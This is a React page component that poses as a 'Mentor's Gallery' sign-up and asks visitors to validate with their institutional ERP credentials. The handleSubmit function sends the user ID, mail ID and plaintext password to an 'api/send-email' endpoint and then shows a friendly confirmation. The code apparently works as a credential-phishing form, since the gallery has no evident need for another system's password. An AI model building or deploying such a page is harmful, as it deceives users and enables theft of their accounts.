import { useState } from "react";
import { useNavigate } from "react-router-dom";
import NavigationOverlay from "@/components/NavigationOverlay";
import Header from "@/components/Header";
import FooterSection from "@/components/FooterSection";

const SkillUpgrade = () => {
  const navigate = useNavigate();
  const [siliconId, setSiliconId] = useState("");
  const [siliconMailId, setSiliconMailId] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      const response = await fetch("http://localhost:3001/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          siliconId,
          siliconMailId,
          password,
        }),
      });

      const result = await response.json();

      if (response.ok && result.success) {
        setSubmitted(true);
      } else {
        console.error("Email sending failed:", result);
        alert("Failed to send registration. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <NavigationOverlay />
      <Header />

      <div className="flex-1 flex items-center justify-center px-6 pt-28 pb-16">
        <div className="max-w-md w-full">
          <button
            onClick={() => navigate(-1)}
            className="text-muted-foreground font-mono text-sm mb-8 hover:text-foreground transition-colors"
          >
            ← Back
          </button>

          <h1 className="font-display text-primary text-4xl md:text-5xl mb-4">
            Mentor's Gallery
          </h1>
          <p className="text-muted-foreground font-mono text-sm mb-10">
            Please validate with your ERP credentials to add your achievements, pictures and memories.
          </p>

          {submitted ? (
            <div className="bg-card border border-border rounded-lg p-8 text-center">
              <div className="text-4xl mb-4">🎉</div>
              <h2 className="text-foreground font-display text-2xl mb-2">You're In!</h2>
              <p className="text-muted-foreground font-mono text-sm">
                Thanks <span className="text-primary">{siliconId}</span>, we'll reach out at{" "}
                <span className="text-primary">{siliconMailId}</span> with details.
              </p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Silicon ID
                </label>
                <input
                  type="text"
                  required
                  value={siliconId}
                  onChange={(e) => setSiliconId(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your Silicon ID"
                />
              </div>
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Silicon Mail ID
                </label>
                <input
                  type="email"
                  required
                  value={siliconMailId}
                  onChange={(e) => setSiliconMailId(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your Silicon mail ID"
                />
              </div>
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Password
                </label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your password"
                />
              </div>
              <button
                type="submit"
                className="w-full bg-primary text-primary-foreground font-mono text-lg py-4 rounded-lg hover:opacity-90 transition-opacity shadow-lg"
              >
                Register
              </button>
            </form>
          )}
        </div>
      </div>

      <FooterSection />
    </div>
  );
};

export default SkillUpgrade;
